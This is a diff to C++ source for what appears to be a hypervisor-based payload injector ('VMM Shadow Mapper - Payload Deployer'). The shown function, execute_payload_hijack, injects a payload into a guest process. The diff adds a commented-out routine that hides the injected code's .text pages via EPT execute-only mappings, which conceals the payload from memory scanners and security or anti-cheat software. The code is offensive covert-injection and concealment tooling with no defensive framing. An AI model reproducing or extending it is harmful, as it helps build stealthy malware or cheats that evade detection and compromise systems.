@@ -1,4 +1,4 @@
-﻿﻿// =============================================================================
+﻿// =============================================================================
 // VMM Shadow Mapper - Payload Deployer (Business Management Module)
 // Coordinates loading of RWbase payloads
 // =============================================================================
@@ -10,6 +10,7 @@
 #include "modules/memory_manager/memory_manager.h"
 #include "modules/slat/slat.h"
 #include "modules/slat/cr3/cr3.h"
+#include "modules/slat/hook/hook.h"
 #include "modules/arch/arch.h"
 #include <intrin.h>
 
@@ -278,8 +279,30 @@ bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
         goto restore_context;
     }
     logs::print(ctx->log_ctx, "[Injection] Stage 3: Section permissions updated\n");
-
-
+/*
+    // ==========================================
+    // 自动隐藏 .text 段 (EPT Execute-Only)
+    // ==========================================
+    for (uint16_t i = 0; i < nt->file_header.number_of_sections; i++) {
+        section_info_t info = {};
+        if (get_payload_section_info(payload::rwbase_image, payload::rwbase_image_size, i, &info)) {
+            if (crt::string_compare(info.name, ".text")) {
+                uint64_t text_va = target_va + info.virtual_address;
+                uint32_t text_size = info.virtual_size;
+                
+                // 按页遍历 .text 段并应用 EPT 隐藏
+                for (uint64_t offset = 0; offset < text_size; offset += 0x1000) {
+                    virtual_address_t page_va = { .address = text_va + offset };
+                    virtual_address_t page_pa = { .address = memory_manager::translate_guest_virtual_address(ctx->guest_cr3, ctx->slat_cr3, page_va) };
+                    if (page_pa.address != 0) {
+                        slat::hook::hide_payload_memory(&g_runtime_context.slat_ctx, page_pa);
+                    }
+                }
+                logs::print(ctx->log_ctx, "[Injection] Stage 3: .text section hidden via EPT\n");
+            }
+        }
+    }
+*/
     entry_va = target_va + nt->optional_header.address_of_entry_point;
     inject_ctx.payload_guest_base.store(target_va);
     inject_ctx.payload_entry.store(entry_va);
